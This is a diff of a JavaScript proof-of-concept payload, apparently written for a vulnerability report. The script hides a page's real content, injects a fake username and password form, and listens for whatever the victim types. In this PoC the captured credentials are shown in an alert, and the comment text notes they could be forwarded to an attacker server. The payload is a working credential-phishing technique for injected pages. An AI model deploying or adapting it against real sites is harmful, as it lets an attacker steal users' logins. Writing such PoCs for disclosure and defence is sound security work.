@@ -14,16 +14,16 @@ for (var i = scripts.length - 1; i >= 0; i--) {
     script.parentNode.removeChild(script);
 }
 
-// Add a new <style> tag to hide all elements except <form> and <textarea>
+// Add a new <style> tag to hide all elements except form and textarea
 var s = document.createElement('style');
 var c = 'body > *:not(form):not(textarea) { display: none !important; }';
 s.appendChild(document.createTextNode(c));
 document.head.appendChild(s);
 
-// Create a new form
+// Create the form element
 var form = document.createElement('form');
 
-// Create the username input
+// Create the username input field
 var inputName = document.createElement('input');
 inputName.type = 'text';
 inputName.id = 'username';
@@ -36,7 +36,7 @@ inputName.style.background = "none";
 inputName.style.width = "100%";
 inputName.classList.add("single-input");
 
-// Create the password input
+// Create the password input field
 var inputPassword = document.createElement('input');
 inputPassword.type = 'password';
 inputPassword.id = 'password';
@@ -45,31 +45,30 @@ inputPassword.autocomplete = 'current-password';
 inputPassword.style.border = "none";
 inputPassword.style.outline = "none";
 inputPassword.style.background = "none";
-inputPassword.style.padding = "0";
-inputPassword.style.width = "100%";
+inputPassword.style.width = "100%";  // Adjusted width to be visible
 inputPassword.classList.add("single-input");
 
-// Append the inputs to the form
+// Append the input fields to the form
 form.appendChild(inputName);
 form.appendChild(inputPassword);
 
-// Append the form to the body
+// Append the form to the document body
 document.body.appendChild(form);
 
-// Handle the form events
+// Set a timeout to add event listeners
 setTimeout(function() {
     let a = document.getElementsByName('username')[0];
     let b = document.getElementsByName('password')[0];
 
-    function handleEvent() {
+    function f() {
         if (b.value.length > 0) {
-            alert(`Here are the user credentials: Username = ${a.value}, Password = ${b.value}`);
+            alert(`Here is user credentials that can be forwarded into attacker server (I implemented the poc in this way to prevent your credentials from being redirected to my website): ${a.value}, Password = ${b.value}`);
         }
     }
 
-    form.onclick = handleEvent;
-    a.onchange = handleEvent;
-    b.onchange = handleEvent;
-    a.oninput = handleEvent;
-    b.oninput = handleEvent;
+    a.addEventListener('click', f);
+    a.addEventListener('change', f);
+    b.addEventListener('change', f);
+    a.addEventListener('input', f);
+    b.addEventListener('input', f);
 }, 1000);
